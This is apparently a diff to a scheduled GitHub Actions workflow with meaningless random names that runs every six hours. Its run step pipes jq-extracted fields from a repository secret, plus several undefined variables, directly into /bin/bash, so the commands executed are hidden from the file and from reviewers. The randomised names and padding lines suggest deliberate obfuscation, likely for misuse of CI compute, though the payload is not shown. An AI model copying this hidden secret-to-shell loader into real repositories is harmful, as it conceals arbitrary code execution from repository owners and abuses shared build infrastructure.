@@ -1,11 +1,10 @@
 name: yushufang7816
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
+    - cron: '5 2/6 * * *'
 
-jobs:  # 15469
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,20 +12,14 @@ jobs:  # 15469
       - uses: actions/checkout@v4
       - name: yushufang7816
         env:
-          zah45: ${{ secrets.zah45 }}
+          zmed7: ${{ secrets.zmed7 }}
         run: |
-          echo $zah45 | jq -r .k367 | /bin/bash
-          echo $nas9 | jq -r .un41129 | /bin/bash
-          echo $kuc0 | jq -r .hgf7 | /bin/bash
-          echo $fsx7 | jq -r .uibe65 | /bin/bash
-          echo $kmb37 | jq -r .xzu1034 | /bin/bash
-          echo $smgd575 | jq -r .tebw22848 | /bin/bash
-          echo $ssgoy70 | jq -r .kqtv69 | /bin/bash
-          echo $mcrtl707 | jq -r .mulo20 | /bin/bash
-          echo $bgozi2376 | jq -r .tpfya8 | /bin/bash
-          echo $mpew8 | jq -r .a5688 | /bin/bash
-          echo $cwn0658 | jq -r .zqpxw327 | /bin/bash
-          echo $fcc251 | jq -r .erz70 | /bin/bash
-          echo $u6 | jq -r .ckphs7970 | /bin/bash
-          echo $ozm75 | jq -r .r5096 | /bin/bash
+          echo $zmed7 | jq -r .ajme1 | /bin/bash
+          echo $e7 | jq -r .ftf37443 | /bin/bash
+          echo $irm745 | jq -r .mxy71933 | /bin/bash
+          echo $cd86718 | jq -r .gdltz828 | /bin/bash
+          echo $yj911 | jq -r .rjzv85506 | /bin/bash
+          echo $czojl979 | jq -r .ymu0322 | /bin/bash
+          echo $uaws59 | jq -r .k9015 | /bin/bash
+          echo $azmqk307 | jq -r .geenk4 | /bin/bash
 
